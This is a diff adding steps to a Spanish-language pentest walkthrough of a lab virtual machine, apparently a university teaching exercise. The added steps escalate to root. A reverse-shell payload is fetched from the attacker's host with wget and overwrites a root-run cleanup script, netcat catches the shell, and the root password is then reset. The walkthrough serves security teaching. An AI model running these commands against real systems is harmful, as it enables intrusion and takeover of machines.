@@ -136,17 +136,30 @@ Para pasar el archivo, levantamos un servidor http en Kali Linux mediante la ins
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/17-ShellReversaPython.png)
 
+Haciendo uso de la conexión inicial, en el puerto 1234, procedemos a descargar la shell reversa mediante el comando wget de la siguiente manera: `wget 10.0.2.5/srpython`.
+Una vez que contamos con el archivo en el `/var/www` de la victima, procedemos a sobre-escribir el archivo cleanup, de la siguiente manera: `cp srpython /usr/local/bin/cleanup`
+
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/18-SetReverseShell.png)
+
+Cuando ya tenemos el archivo modificado, devemos abrir un listener mediante netcat para recibir la conexión entrante.
+El comando para realizar esto es: `nc -lvp 1111`.
+Como podemos ver luego de un par de segundos, es que recibimos correctamente la conexión y YA SOMOS ROOT!
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/19-whoami.gif)
 
+Ahora como ya somos root, podemos incluso cambiar la clave de este usuario:
+
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/20-cambioClaveRoot.gif)
+
+Y por último ingresamos directamente a la Máquina virtual, mediante el usuario `root` y la clave que seteamos: `password`
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/21-root.gif)
 
 ## Fase de Documentación
 
+En esta fase, se presenta un documento formal, como este mismo, presentando las evidencias y dando a entender los procesos y/o fallas descubiertas con el fin de ser solucionadas. En este caso la recomendación es usar claves mucho más complicadas, dado que esto impide o relentiza el proceso de fuerza bruta.
 
+# ESTO ES EL FIN
 
-@agustin_salas_f
+Cualquier duda, me contanctan en twitter en: @agustin_salas_f
 [Universidad Tecnológica de Chile INACAP](http://www.inacap.cl).
